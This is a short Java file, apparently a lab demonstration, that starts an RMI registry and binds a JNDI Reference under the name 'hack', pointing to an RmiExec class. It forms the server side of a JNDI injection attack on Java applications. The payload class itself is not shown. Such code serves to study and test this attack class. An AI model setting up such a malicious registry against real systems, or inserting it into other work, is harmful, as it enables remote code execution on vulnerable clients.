package com.example.rmiservice;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiService {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            Reference reference = new Reference("com.example.rmiservice.RmiExec","com.example.rmiservice.RmiExec",null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("hack",referenceWrapper);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
